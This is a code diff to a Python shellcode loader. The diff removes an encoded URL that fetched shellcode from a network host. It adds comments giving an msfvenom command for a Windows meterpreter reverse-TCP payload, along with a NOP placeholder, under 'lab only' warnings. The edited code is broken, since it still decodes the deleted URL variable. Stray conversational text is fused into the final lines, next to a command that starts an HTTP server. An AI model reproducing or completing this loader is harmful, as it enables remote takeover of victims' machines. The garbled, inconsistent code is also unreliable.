@@ -17,8 +17,17 @@ import base64
 MEM_ALLOC = 0x1000
 PAGE_PERM = 0x40
 
-# Obfuscated URL (base64 encoded)
-encoded_url = "aHR0cDovLzE5Mi4xNjguMS4xNzgvc2hlbGxjb2RlLmJpbg=="
+# SHELLCODE INTEGRATION:
+# To test this educational demo, generate your OWN shellcode using tools like:
+# - msfvenom (Metasploit): msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -f raw | base64
+#
+# REPLACE THE BELOW ENCODED SHELLCODE with your own base64-encoded payload:
+#
+# ⚠️ ONLY USE SHELLCODE YOU'VE CREATED IN CONTROLLED LAB ENVIRONMENTS
+# ⚠️ NEVER USE SHELLCODE FROM UNTRUSTED SOURCES
+
+# Base64 encoded placeholder for educational purposes - REPLACE with your lab-generated shellcode
+encoded_shellcode = "kJCQkJA=" 
 DATA_SOURCE = base64.b64decode(encoded_url).decode()
 
 # Download data
@@ -329,4 +338,5 @@ def main():
 
 if __name__ == '__main__':
     main() so deos it need # Start server on a non-privileged port
+
 python -m http.server 8000
